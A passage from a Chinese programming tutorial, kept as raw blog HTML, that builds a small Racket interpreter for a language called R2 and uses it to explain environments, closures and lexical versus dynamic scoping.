plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(calc &apos;(+ 1 2))</span><br><span class="line">;; =&gt; 3</span><br><span class="line">(calc &apos;(* 2 3))</span><br><span class="line">;; =&gt; 6</span><br><span class="line">(calc &apos;(* (+ 1 2) (+ 3 4)))</span><br><span class="line">;; =&gt; 21</span><br></pre></td></tr></table></figure><p>（完整的代码和示例，可以在<a href="https://github.com/yinwang0/interpreters/blob/master/calculator.ss" target="_blank" rel="noopener">这里下载</a>。）</p><p>跟之前的二叉树求和代码比较一下，你会发现它们惊人的相似，因为解释器本来就是一个树遍历算法。不过你发现它们有什么不同吗？它们的不同点在于：</p><ol><li><p>算术表达式的模式里面，多出了一个“操作符”（op）叶节点：(,op ,e1 ,e2)</p></li><li><p>对子树 e1 和 e2 分别求值之后，我们不是返回 (+ v1 v2)，而是根据 op 的不同，返回不同的结果：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(match op</span><br><span class="line">  [&apos;+ (+ v1 v2)]</span><br><span class="line">  [&apos;- (- v1 v2)]</span><br><span class="line">  [&apos;* (* v1 v2)]</span><br><span class="line">  [&apos;/ (/ v1 v2)])</span><br></pre></td></tr></table></figure><p>最后你发现，一个算术表达式的解释器，不过是一个稍加扩展的树遍历算法。</p><h2 id="R2：一个很小的程序语言"><a href="#R2：一个很小的程序语言" class="headerlink" title="R2：一个很小的程序语言"></a>R2：一个很小的程序语言</h2><p>实现了一个计算器，现在让我们过渡到一种更强大的语言。为了方便称呼，我给它起了一个萌萌哒名字，叫 R2。R2 比起之前的计算器，只多出四个元素，它们分别是：变量，函数，绑定，调用。再加上之前介绍的算术操作，我们就得到一个很简单的程序语言，它只有5种不同的构造。用 Scheme 的语法，这5种构造看起来就像这样：</p><ul><li>变量：x</li><li>函数：(lambda (x) e)</li><li>绑定：(let ([x e1]) e2)</li><li>调用：(e1 e2)</li><li>算术：(• e2 e2)<br>（其中，• 是一个算术操作符，可以选择 +, -, *, / 其中之一）</li></ul><p>一般程序语言还有很多其它构造，可是一开头就试图去实现所有那些，只会让人糊涂。最好是把这少数几个东西搞清楚，确保它们正确之后，才慢慢加入其它元素。</p><p>这些构造的语义，跟 Scheme 里面的同名构造几乎一模一样。如果你不清楚什么是”绑定“，那你可以把它看成是普通语言里的”变量声明“。</p><p>需要注意的是，跟一般语言不同，我们的函数只接受一个参数。这不是一个严重的限制，因为在我们的语言里，函数可以被作为值传递，也就是所谓“first-class function”。所以你可以用嵌套的函数定义来表示有两个以上参数的函数。</p><p>举个例子， (lambda (x) (lambda (y) (+ x y))) 是个嵌套的函数定义，它也可以被看成是有两个参数（x 和 y）的函数，这个函数返回 x 和 y 的和。当这样的函数被调用的时候，需要两层调用，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(((lambda (x) (lambda (y) (+ x y))) 1) 2)</span><br><span class="line">;; =&gt; 3</span><br></pre></td></tr></table></figure><p>这种做法在PL术语里面，叫做咖喱（currying）。看起来啰嗦，但这样我们的解释器可以很简单。等我们理解了基本的解释器，再实现真正的多参数函数也不迟。</p><p>另外，我们的绑定语法 (let ([x e1]) e2)，比起 Scheme 的绑定也有一些局限。我们的 let 只能绑定一个变量，而 Scheme 可以绑定多个，像这样 (let ([x 1] [y 2]) (+ x y))。这也不是一个严重的限制，因为我们可以啰嗦一点，用嵌套的 let 绑定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(let ([x 1])</span><br><span class="line">  (let ([y 2])</span><br><span class="line">    (+ x y)))</span><br></pre></td></tr></table></figure><h2 id="R2-的解释器"><a href="#R2-的解释器" class="headerlink" title="R2 的解释器"></a>R2 的解释器</h2><p>下面是我们今天要完成的解释器，它可以运行一个 R2 程序。你可以先留意一下各部分的注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#lang racket</span><br><span class="line"></span><br><span class="line">;;; 以下三个定义 env0, ext-env, lookup 是对环境（environment）的基本操作：</span><br><span class="line"></span><br><span class="line">;; 空环境</span><br><span class="line">(define env0 &apos;())</span><br><span class="line"></span><br><span class="line">;; 扩展。对环境 env 进行扩展，把 x 映射到 v，得到一个新的环境</span><br><span class="line">(define ext-env</span><br><span class="line">  (lambda (x v env)</span><br><span class="line">    (cons `(,x . ,v) env)))</span><br><span class="line"></span><br><span class="line">;; 查找。在环境中 env 中查找 x 的值。如果没找到就返回 #f</span><br><span class="line">(define lookup</span><br><span class="line">  (lambda (x env)</span><br><span class="line">    (let ([p (assq x env)])</span><br><span class="line">      (cond</span><br><span class="line">       [(not p) #f]</span><br><span class="line">       [else (cdr p)]))))</span><br><span class="line">       </span><br><span class="line">;; 闭包的数据结构定义，包含一个函数定义 f 和它定义时所在的环境</span><br><span class="line">(struct Closure (f env))</span><br><span class="line"></span><br><span class="line">;; 解释器的递归定义（接受两个参数，表达式 exp 和环境 env）</span><br><span class="line">;; 共 5 种情况（变量，函数，绑定，调用，数字，算术表达式）</span><br><span class="line">(define interp</span><br><span class="line">  (lambda (exp env)</span><br><span class="line">    (match exp                                          ; 对exp进行模式匹配</span><br><span class="line">      [(? symbol? x)                                    ; 变量</span><br><span class="line">       (let ([v (lookup x env)])</span><br><span class="line">         (cond</span><br><span class="line">          [(not v)</span><br><span class="line">           (error &quot;undefined variable&quot; x)]</span><br><span class="line">          [else v]))]      </span><br><span class="line">      [(? number? x) x]                                 ; 数字</span><br><span class="line">      [`(lambda (,x) ,e)                                ; 函数</span><br><span class="line">       (Closure exp env)]</span><br><span class="line">      [`(let ([,x ,e1]) ,e2)                            ; 绑定</span><br><span class="line">       (let ([v1 (interp e1 env)])</span><br><span class="line">         (interp e2 (ext-env x v1 env)))]</span><br><span class="line">      [`(,e1 ,e2)                                       ; 调用</span><br><span class="line">       (let ([v1 (interp e1 env)]</span><br><span class="line">             [v2 (interp e2 env)])</span><br><span class="line">         (match v1</span><br><span class="line">           [(Closure `(lambda (,x) ,e) env-save)</span><br><span class="line">            (interp e (ext-env x v2 env-save))]))]</span><br><span class="line">      [`(,op ,e1 ,e2)                                   ; 算术表达式</span><br><span class="line">       (let ([v1 (interp e1 env)]</span><br><span class="line">             [v2 (interp e2 env)])</span><br><span class="line">         (match op</span><br><span class="line">           [&apos;+ (+ v1 v2)]</span><br><span class="line">           [&apos;- (- v1 v2)]</span><br><span class="line">           [&apos;* (* v1 v2)]</span><br><span class="line">           [&apos;/ (/ v1 v2)]))])))</span><br><span class="line"></span><br><span class="line">;; 解释器的“用户界面”函数。它把 interp 包装起来，掩盖第二个参数，初始值为 env0</span><br><span class="line">(define r2</span><br><span class="line">  (lambda (exp)</span><br><span class="line">    (interp exp env0)))</span><br></pre></td></tr></table></figure><p>这里有一些测试例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(r2 &apos;(+ 1 2))</span><br><span class="line">;; =&gt; 3</span><br><span class="line"></span><br><span class="line">(r2 &apos;(* 2 3))</span><br><span class="line">;; =&gt; 6</span><br><span class="line"></span><br><span class="line">(r2 &apos;(* 2 (+ 3 4)))</span><br><span class="line">;; =&gt; 14</span><br><span class="line"></span><br><span class="line">(r2 &apos;(* (+ 1 2) (+ 3 4)))</span><br><span class="line">;; =&gt; 21</span><br><span class="line"></span><br><span class="line">(r2 &apos;((lambda (x) (* 2 x)) 3))</span><br><span class="line">;; =&gt; 6</span><br><span class="line"></span><br><span class="line">(r2</span><br><span class="line">&apos;(let ([x 2])</span><br><span class="line">   (let ([f (lambda (y) (* x y))])</span><br><span class="line">     (f 3))))</span><br><span class="line">;; =&gt; 6</span><br><span class="line"></span><br><span class="line">(r2</span><br><span class="line">&apos;(let ([x 2])</span><br><span class="line">   (let ([f (lambda (y) (* x y))])</span><br><span class="line">     (let ([x 4])</span><br><span class="line">       (f 3)))))</span><br><span class="line">;; =&gt; 6</span><br></pre></td></tr></table></figure><p>（完整的代码和示例，可以在<a href>这里下载</a><a href="https://github.com/yinwang0/interpreters/blob/master/r2-interpreter.ss。" target="_blank" rel="noopener">https://github.com/yinwang0/interpreters/blob/master/r2-interpreter.ss。</a>)</p><p>在接下来的几节，我们来仔细看看这个解释器的各个部分。</p><h2 id="对基本算术操作的解释"><a href="#对基本算术操作的解释" class="headerlink" title="对基本算术操作的解释"></a>对基本算术操作的解释</h2><p>算术操作一般都是程序里最基本的构造，它们不能再被细分为多个步骤，所以我们先来看看对算术操作的处理。以下就是 R2 解释器处理算术的部分，它是 interp 的最后一个分支。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(match exp</span><br><span class="line">  ... ...</span><br><span class="line">  [`(,op ,e1 ,e2)</span><br><span class="line">   (let ([v1 (interp e1 env)]             ; 递归调用 interp 自己，得到 e1 的值</span><br><span class="line">         [v2 (interp e2 env)])            ; 递归调用 interp 自己，得到 e2 的值</span><br><span class="line">     (match op                            ; 分支：处理操作符 op 的 4 种情况</span><br><span class="line">       [&apos;+ (+ v1 v2)]                     ; 如果是加号，输出结果为 (+ v1 v2)</span><br><span class="line">       [&apos;- (- v1 v2)]                     ; 如果是减号，乘号，除号，相似的处理</span><br><span class="line">       [&apos;* (* v1 v2)]</span><br><span class="line">       [&apos;/ (/ v1 v2)]))])</span><br></pre></td></tr></table></figure><p>你可以看到它几乎跟刚才写的计算器一模一样，不过现在 interp 的调用多了一个参数 env 而已。这个 env 是所谓“环境”，我们下面很快就讲。</p><h2 id="对数字的解释"><a href="#对数字的解释" class="headerlink" title="对数字的解释"></a>对数字的解释</h2><p>对数字的解释很简单，把它们原封不动返回就可以了。</p><p>[(? number? x) x]</p><h2 id="变量和函数"><a href="#变量和函数" class="headerlink" title="变量和函数"></a>变量和函数</h2><p>变量和函数是解释器里最麻烦的部分，所以我们来仔细看看。</p><p>变量（variable）的产生，是数学史上的最大突破之一。因为变量可以被绑定到不同的值，从而使函数的实现成为可能。比如数学函数 f(x) = x <em> 2，其中 x 是一个变量，它把输入的值传递到函数体 x </em> 2 里面。如果没有变量，函数就不可能实现。</p><p>对变量最基本的操作，是对它的“绑定”（binding）和“取值”（evaluate）。什么是绑定呢？拿上面的函数 f(x) 作为例子。当我们调用 f(1) 时，函数体里面的 x 等于 1，所以 x <em> 2 的值是 2，而当我们调用 f(2) 时，函数体里面的 x 等于 2，所以 x </em> 2 的值是 4。这里，两次对 f 的调用，分别对 x 进行了两次绑定。第一次 x 被绑定到了 1，第二次被绑定到了 2。</p><p>你可以把“绑定”理解成这样一个动作，就像当你把插头插进电源插座的那一瞬间。插头的插脚就是 f(x) 里面的那个 x，而 x * 2 里面的 x，则是电线的另外一端。所以当你把插头插进插座，电流就通过这根电线到达另外一端。如果电线导电性能良好，两头的电压应该相等。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>我们的解释器只能一步一步的做事情。比如，当它需要求 f(1) 的值的时候，它分成两步操作：</p><ol><li>把 x 绑定到 1，这样函数体内才能看见这个绑定。</li><li>进入 f 的函数体，对 x * 2 进行求值。</li></ol><p>这就像一个人做出这两个动作：</p><ol><li>把插头插进插座 。</li><li>到电线的另外一头，测量它的电压，并且把结果乘以 2。</li></ol><p>在第一步和第二步之间，我们如何记住 x 的值呢？通过所谓“环境”！我们用环境记录变量的值，并且把它们传递到变量的“可见区域”。变量的可见区域，用术语说叫做“作用域”（scope）。</p><p>在我们的解释器里，用于处理环境的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">;; 空环境</span><br><span class="line">(define env0 &apos;())</span><br><span class="line"></span><br><span class="line">;; 对环境 env 进行扩展，把 x 映射到 v</span><br><span class="line">(define ext-env</span><br><span class="line">  (lambda (x v env)</span><br><span class="line">    (cons `(,x . ,v) env)))</span><br><span class="line"></span><br><span class="line">;; 取值。在环境中 env 中查找 x 的值</span><br><span class="line">(define lookup</span><br><span class="line">  (lambda (x env)</span><br><span class="line">    (let ([p (assq x env)])</span><br><span class="line">      (cond</span><br><span class="line">       [(not p) #f]</span><br><span class="line">       [else (cdr p)]))))</span><br></pre></td></tr></table></figure><p>这里我们用一种最简单的数据结构，Scheme 的 association list，来表示环境。Association list 看起来像这个样子：((x . 1) (y . 2) (z . 5))。它是一个两元组（pair）的链表，左边的元素是 key，右边的元素是 value。写得直观一点就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">((x . 1)</span><br><span class="line"> (y . 2)</span><br><span class="line"> (z . 5))</span><br></pre></td></tr></table></figure><p>查表操作就是从头到尾搜索，如果左边的 key 是要找的变量，就返回整个 pair。简单吧？效率很低，但是足够完成我们现在的任务。</p><p>ext-env 函数扩展一个环境。比如，如果原来的环境 env1 是 ((y . 2) (x . 1)) 那么 (ext-env x 3 env1)，就会返回 ((x . 3) (y . 2) (x . 1))。也就是把 (x . 3) 加到 env1 的最前面去。</p><p>那我们什么时候需要扩展环境呢？当我们进行绑定的时候。绑定可能出现在函数调用时，也可能出现在 let 绑定时。我们选择的数据结构，使得环境自然而然的具有了作用域（scope）的特性。</p><p>环境其实是一个堆栈（stack）。内层的绑定，会出现在环境的最上面，这就是在“压栈”。这样我们查找变量的时候，会优先找到最内层定义的变量。</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(let ([x 1])         ; env=&apos;()。绑定x到1。</span><br><span class="line">  (let ([y 2])       ; env=&apos;((x . 1))。绑定y到2。</span><br><span class="line">    (let ([x 3])     ; env=&apos;((y . 2) (x . 1))。绑定x到3。</span><br><span class="line">      (+ x y))))     ; env=&apos;((x . 3) (y . 2) (x . 1))。查找x，得到3；查找y，得到2。</span><br><span class="line">;; =&gt; 5</span><br></pre></td></tr></table></figure><p>这段代码会返回5。这是因为最内层的绑定，把 (x . 3) 放到了环境的最前面，这样查找 x 的时候，我们首先看到 (x . 3)，然后就返回值3。之前放进去的 (x . 1) 仍然存在，但是我们先看到了最上面的那个(x . 3)，所以它被忽略了。</p><p>这并不等于说 (x . 1) 就可以被改写或者丢弃，因为它仍然是有用的。你只需要看一个稍微不同的例子，就知道这是怎么回事：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(let ([x 1])          ; env=&apos;()。绑定x到1。</span><br><span class="line">  (+ (let ([x 2])     ; env=&apos;((x . 1))。绑定x到2。</span><br><span class="line">       x)             ; env=&apos;((x . 2) (x . 1))。查找x，得到2。</span><br><span class="line">   x))                ; env=&apos;((x . 1))。查找x，得到1。</span><br><span class="line">;; =&gt; 3               ; 两个不同的x的和，1+2等于3。</span><br></pre></td></tr></table></figure><p>这个例子会返回3。它是第3行和第4行里面两个 x 的和。由于第3行的 x 处于内层 let 里面，那里的环境是 ((x . 2) (x . 1))，所以查找 x 的值得到2。第4行的 x 在内层 let 外面，但是在外层 let 里面，那里的环境是 ((x . 1))，所以查找 x 的值得到1。这很符合直觉，因为 x 总是找到最内层的定义。</p><p>值得注意的是，环境被扩展以后，形成了一个新的环境，而原来的环境并没有被改变。比如，上面的 ((y . 2) (x . 1)) 并没有删除或者修改，只不过是被“引用”到一个更大的列表里去了。</p><p>这样不对已有数据进行修改（mutation）的数据结构，叫做“函数式数据结构”。函数式数据结构只生成新的数据，而不改变或者删除老的。它可能引用老的结构，然而却不改变老的结构。这种“不修改”（immutable）的性质，在我们的解释器里是很重要的，因为当我们扩展一个环境，进入递归，返回之后，外层的代码必须仍然可以访问原来外层的环境。</p><p>当然，我们也可以用另外的，更高效的数据结构（比如平衡树，串接起来的哈希表）来表示环境。如果你学究一点，甚至可以用函数来表示环境。这里为了代码简单，我们选择了最笨，然而正确，容易理解的数据结构。</p><h2 id="对变量的解释"><a href="#对变量的解释" class="headerlink" title="对变量的解释"></a>对变量的解释</h2><p>了解了变量，函数和环境，我们来看看解释器对变量的“取值”操作，也就是 match 的第一种情况。</p><p>[(? symbol? x) (lookup x env)]</p><p>这就是在环境中，沿着从内向外的“作用域顺序”，查找变量的值。</p><p>这里的 (? symbol? x) 是一种特殊的模式，它使用 Scheme 函数 symbol? 来判断输入是否是一个符号，如果是，就把它绑定到 x，然后你就可以在右边用 x 来指称这个输入。</p><h2 id="对绑定的解释"><a href="#对绑定的解释" class="headerlink" title="对绑定的解释"></a>对绑定的解释</h2><p>现在我们来看看对 let 绑定的解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[`(let ([,x ,e1]) ,e2)                           </span><br><span class="line"> (let ([v1 (interp e1 env)])              ; 解释右边表达式e1，得到值v1</span><br><span class="line">   (interp e2 (ext-env x v1 env)))]       ; 把(x . v1)扩充到环境顶部，对e2求值</span><br></pre></td></tr></table></figure><p>通过代码里的注释，你也许已经可以理解它在做什么。我们先对表达式 e1 求值，得到 v1。然后我们把 (x . v1) 扩充到环境里，这样 (let ([x e1]) …) 内部都可以看到 x 的值。然后我们使用这个扩充后的环境，递归调用解释器本身，对 let 的主体 e2 求值。它的返回值就是这个 let 绑定的值。</p><h2 id="Lexical-Scoping-和-Dynamic-Scoping"><a href="#Lexical-Scoping-和-Dynamic-Scoping" class="headerlink" title="Lexical Scoping 和 Dynamic Scoping"></a>Lexical Scoping 和 Dynamic Scoping</h2><p>下面我们准备谈谈函数定义和调用。对函数的解释是一个微妙的问题，很容易弄错，这是由于函数体内也许会含有外层的变量，叫做“自由变量”。所以在分析函数的代码之前，我们来了解一下不同的“作用域”（scoping）规则。</p><p>我们举个例子来解释这个问题。下面这段代码，它的值应该是多少呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(let ([x 2])</span><br><span class="line">  (let ([f (lambda (y) (* x y))])</span><br><span class="line">    (let ([x 4])</span><br><span class="line">      (f 3))))</span><br></pre></td></tr></table></figure><p>在这里，f 函数体 (lambda (y) (* x y)) 里的那个 x，就是一个“自由变量”。x 并不是这个函数的参数，也不是在这个函数里面定义的，所以我们必须到函数外面去找 x 的值。</p><p>我们的代码里面，有两个地方对 x 进行了绑定，一个等于2，一个等于4，那么 x 到底应该是指向哪一个绑定呢？这似乎无关痛痒，然而当我们调用 (f 3) 的时候，严重的问题来了。f 的函数体是 (* x y)，我们知道 y 的值来自参数 3，可是 x 的值是多少呢？它应该是2，还是4呢？</p><p>在历史上，这段代码可能有两种不同的结果，这种区别一直延续到今天。如果你在 Scheme （Racket）里面写以上的代码，它的结果是6。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;; Scheme</span><br><span class="line">(let ([x 2])</span><br><span class="line">  (let ([f (lambda (y) (* x y))])</span><br><span class="line">    (let ([x 4])</span><br><span class="line">      (f 3))))</span><br><span class="line"></span><br><span class="line">;; =&gt; 6</span><br></pre></td></tr></table></figure><p>现在我们来看看，在 Emacs Lisp 里面输入等价的代码，得到什么结果。如果你不熟悉 Emacs Lisp 的用法，那你可以跟我做：把代码输入 Emacs 的那个叫 <em>scratch</em> 的 buffer。把光标放在代码最后，然后按 C-x C-e，这样 Emacs 会执行这段代码，然后在 minibuffer 里显示结果：</p><p><img src="http://upload-images.jianshu.io/upload_images/68562-ba6ffcfc96ef6f9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/300" alt></p><p>结果是12！如果你把代码最内层的 x 绑定修成其它的值，输出会随之改变。</p><p>奇怪吧？Scheme 和 Emacs Lisp，到底有什么不一样呢？实际上，这两种看似差不多的 “Lisp 方言”，采用了两种完全不同的作用域方式。Scheme 的方式叫做 lexical scoping （或者 static scoping），而 Emacs 的方式叫做 dynamic scoping。</p><p>那么哪一种方式更好呢？或者用哪一种都无所谓？答案是，dynamic scoping 是非常错误的做法。历史的教训告诉我们，它会带来许许多多莫名其妙的 bug，导致 dynamic scoping 的语言几乎完全没法用。这是为什么呢？</p><p>原因在于，像 (let ((x 4)) …) 这样的变量绑定，只应该影响它内部“看得见”的 x 的值。当我们看见 (let ((x 4)) (f 3)) 的时候，并没有在 let 的内部看见任何叫“x” 的变量，所以我们“直觉”的认为，(let ((x 4)) …) 对 x 的绑定，不应该引起 (f 3) 的结果变化。</p><p>然而对于 dynamic scoping，我们的直觉却是错误的。因为 f 的函数体里面有一个 x，虽然我们没有在 (f 3) 这个调用里面看见它，然而它却存在于 f 定义的地方。要知道，f 定义的地方也许隔着几百行代码，甚至在另外一个文件里面。而且调用函数的人凭什么应该知道， f 的定义里面有一个自由变量，它的名字叫做 x？所以 dynamic scoping 在设计学的角度来看，是一个反人类的设计 :)</p><p>相反，lexical scoping 却是符合人们直觉的。虽然在 (let ((x 4)) (f 3)) 里面，我们把 x 绑定到了 4，然而 f 的函数体并不是在那里定义的，我们也没在那里看见任何 x，所以 f 的函数体里面的 x，仍然指向我们定义它的时候看得见的那个 x，也就是最上面的那个 (let ([x 2]) …)，它的值是 2。所以 (f 3) 的值应该等于 6，而不是12。</p><h2 id="对函数的解释"><a href="#对函数的解释" class="headerlink" title="对函数的解释"></a>对函数的解释</h2><p>为了实现 lexical scoping，我们必须把函数做成“闭包”（closure）。闭包是一种特殊的数据结构，它由两个元素组成：函数的定义和当前的环境。我们把闭包定义为一个 Racket 的 struct 结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct Closure (f env))</span><br></pre></td></tr></table></figure><p>有了这个数据结构，我们对 (lambda (x) e) 的解释就可以写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[`(lambda (,x) ,e)</span><br><span class="line"> (Closure exp env)]</span><br></pre></td></tr></table></figure><p>注意这里的 exp 就是 <code></code>(lambda (,x) ,e)` 自己。</p><p>有意思的是，我们的解释器遇到 (lambda (x) e)，几乎没有做任何计算。它只是把这个函数包装了一下，把它与当前的环境一起，打包放到一个数据结构（Closure）里面。这个闭包结构，记录了我们在函数定义的位置“看得见”的那个环境。稍候在调用的时候，我们就能从这个闭包的环境里面，得到函数体内的自由变量的值。</p><h2 id="对调用的解释"><a href="#对调用的解释" class="headerlink" title="对调用的解释"></a>对调用的解释</h2><p>好了，我们终于到了最后的关头，函数调用。为了直观，我们把函数调用的代码拷贝如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[`(,e1 ,e2)                                            </span><br><span class="line"> (let ([v1 (interp e1 env)]             ; 计算函数 e1 的值</span><br><span class="line">       [v2 (interp e2 env)])            ; 计算参数 e2 的值</span><br><span class="line">   (match v1</span><br><span class="line">     [(Closure `(lambda (,x) ,e) env-save)      ; 用模式匹配的方式取出闭包里的各个子结构</span><br><span class="line">      (interp e (ext-env x v2 env-save))]))]    ; 在闭包的环境env-save中把x绑定到v2，解释函数体</span><br></pre></td></tr></table></figure><p>函数调用都是 (e1 e2) 这样的形式，e1 表示函数，e2 是它的参数。我们需要先分别求出函数 e1 和参数 e2 的值。</p><p>函数调用就像把一个电器的插头插进插座，使它开始运转。比如，当 (lambda (x) (<em> x 2)) 被作用于 1 时，我们把 x 绑定到 1，然后解释它的函数体 (</em> x 2)。但是这里有一个问题，函数体内的自由变量应该取什么值呢？从上面闭包的讨论，你已经知道了，自由变量的值，应该从闭包的环境查询。</p><p>操作数 e1 的值 v1 是一个闭包，它里面包含一个函数定义时保存的环境 env-save。我们把这个环境 env-save 取出来，那我们就可以查询它，得到函数体内自由变量的值。然而函数体内不仅有自由变量，还有对函数参数的使用，所以我们必须扩展这个 env-save 环境，把参数的值加进去。这就是为什么我们使用 (ext-env x v2 env-save)，而不只是 env-save。</p><p>你可能会奇怪，那么解释器的环境 env 难道这里就不用了吗？是的。我们通过 env 来计算 e1 和 e2 的值，是因为 e1 和 e2 里面的变量，在“当前环境”（env）里面看得见。可是函数体的定义，在当前环境下是看不见的。它的代码在别的地方，而那个地方看得见的环境，被我们存在闭包里了，它就是 env-save。所以我们把 v1 里面的闭包环境 env-save 取出来，用于计算函数体的值。</p><p>有意思的是，如果我们用 env，而不是env-save 来解释函数体，那我们的语言就变成了 dynamic scoping。现在来实验一下：你可以把 (interp e (ext-env x v2 env-save)) 里面的 env-save 改成 env，再试试我们之前讨论过的代码，它的输出就会变成 12。那就是我们之前讲过的，dynamic scoping 的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(r2</span><br><span class="line">&apos;(let ([x 2])</span><br><span class="line">   (let ([f (lambda (y) (* x y))])</span><br><span class="line">     (let ([x 4])</span><br><span class="line">       (f 3)))))</span><br><span class="line"></span><br><span class="line">;; =&gt; 12</span><br></pre></td></tr></table></figure><p>你也许发现了，如果我们的语言是 dynamic scoping，那就没必要使用闭包了，因为我们根本不需要闭包里面保存的环境。这样一来，dynamic scoping 的解释器就可以写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(define interp</span><br><span class="line">  (lambda (exp env)</span><br><span class="line">    (match exp                                          </span><br><span class="line">      ... ...</span><br><span class="line">      [`(lambda (,x) ,e)                          ; 函数：直接返回自己的表达式</span><br><span class="line">       exp]</span><br><span class="line">      ... ...</span><br><span class="line">      [`(,e1 ,e2)                                       </span><br><span class="line">       (let ([v1 (interp e1 env)]</span><br><span class="line">             [v2 (interp e2 env)])</span><br><span class="line">         (match v1</span><br><span class="line">           [`(lambda (,x) ,e)                     ; 调用：直接使用函数的表达式本身</span><br><span class="line">            (interp e (ext-env x v2 env))]))]</span><br><span class="line">      ... ...</span><br><span 